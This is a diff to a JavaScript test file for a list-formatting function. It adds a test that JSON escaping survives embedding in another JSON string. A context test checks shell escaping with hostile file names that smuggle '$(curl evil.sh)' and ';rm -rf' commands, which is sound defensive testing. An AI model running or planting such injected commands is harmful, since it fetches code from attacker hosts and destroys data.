@@ -98,6 +98,12 @@ describe("formatList", () => {
     assert.equal(formatList(items, { json: true, escapeJson: false }), '["a.txt","b c.txt"]');
   });
 
+  it("round-trips escaped JSON through an enclosing JSON string", () => {
+    const awkward = ['quo"te.txt', "back\\slash.txt", "new\nline.txt"];
+    const embedded = `{"files": "${formatList(awkward, { json: true })}"}`;
+    assert.deepEqual(JSON.parse(JSON.parse(embedded).files), awkward);
+  });
+
   it("escapes shell metacharacters only when safe_output is on", () => {
     const hostile = ["$(curl evil.sh).txt", "it's;rm -rf.txt"];
     assert.equal(formatList(hostile), "\\$\\(curl evil.sh\\).txt it\\'s\\;rm -rf.txt");
